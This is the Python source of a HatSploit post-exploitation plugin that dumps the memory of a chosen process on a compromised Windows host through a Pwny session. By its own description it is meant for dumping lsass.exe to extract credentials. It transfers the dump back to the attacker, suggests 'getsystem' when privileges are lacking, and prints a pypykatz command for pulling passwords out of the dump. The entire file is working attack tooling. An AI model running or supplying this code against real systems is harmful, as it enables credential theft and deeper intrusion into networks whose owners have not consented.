"""
This plugin requires HatSploit: https://hatsploit.com
Current source: https://github.com/EntySec/HatSploit
"""

import os

from badges.cmd import Command

from pwny.api import *
from pwny.types import *

from hatsploit.lib.core.plugin import Plugin

MINIDUMP_CREATE = tlv_custom_tag(API_CALL_STATIC, TAB_BASE, API_CALL)

TLV_TYPE_MD_PID = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE)
TLV_TYPE_MD_PATH = tlv_custom_type(TLV_TYPE_STRING, TAB_BASE, API_TYPE)
TLV_TYPE_MD_DATA = tlv_custom_type(TLV_TYPE_BYTES, TAB_BASE, API_TYPE)
TLV_TYPE_MD_SIZE = tlv_custom_type(TLV_TYPE_INT, TAB_BASE, API_TYPE + 1)


class HatSploitPlugin(Plugin):
    def __init__(self):
        super().__init__({
            'Name': "Minidump Plugin",
            'Plugin': "minidump",
            'Authors': [
                'EntySec - plugin developer',
            ],
            'Description': (
                "Create process memory dumps via MiniDumpWriteDump. "
                "Useful for dumping lsass.exe for credential extraction."
            ),
        })

        self.commands = [
            Command({
                'Category': "gather",
                'Name': "minidump",
                'Description': "Dump process memory.",
                'MinArgs': 1,
                'Options': [
                    (
                        ('pid',),
                        {
                            'help': "PID of the process to dump.",
                            'type': int,
                        }
                    ),
                    (
                        ('-o', '--output'),
                        {
                            'help': (
                                "Local path to save the dump file. "
                                "If omitted, dump is transferred to attacker."
                            ),
                            'metavar': 'PATH',
                        }
                    ),
                    (
                        ('-r', '--remote'),
                        {
                            'help': (
                                "Remote path on target to save dump. "
                                "Avoids transferring large files."
                            ),
                            'metavar': 'PATH',
                        }
                    ),
                ]
            })
        ]

    def minidump(self, args):
        pid = args.pid

        self.print_process(f"Creating memory dump of PID {pid}...")

        tlv_args = {TLV_TYPE_MD_PID: pid}

        if args.remote:
            tlv_args[TLV_TYPE_MD_PATH] = args.remote

        result = self.session.send_command(
            tag=MINIDUMP_CREATE,
            plugin=self.plugin,
            args=tlv_args,
        )

        if result.get_int(TLV_TYPE_STATUS) != TLV_STATUS_SUCCESS:
            self.print_error("Failed to create minidump!")
            self.print_error(
                "Ensure you have sufficient privileges "
                "(try getsystem first)."
            )
            return

        size = result.get_int(TLV_TYPE_MD_SIZE)

        if args.remote:
            self.print_success(
                f"Dump saved to remote path: {args.remote} "
                f"({size} bytes)"
            )
            return

        # Dump was returned in the TLV response
        data = result.get_raw(TLV_TYPE_MD_DATA)
        if not data:
            self.print_error("No dump data received!")
            return

        output = args.output or f"minidump_{pid}.dmp"
        with open(output, 'wb') as f:
            f.write(data)

        self.print_success(
            f"Dump saved to {output} ({len(data)} bytes)"
        )
        self.print_information(
            "Use mimikatz or pypykatz to extract credentials:"
        )
        self.print_information(
            f"  pypykatz lsa minidump {output}"
        )
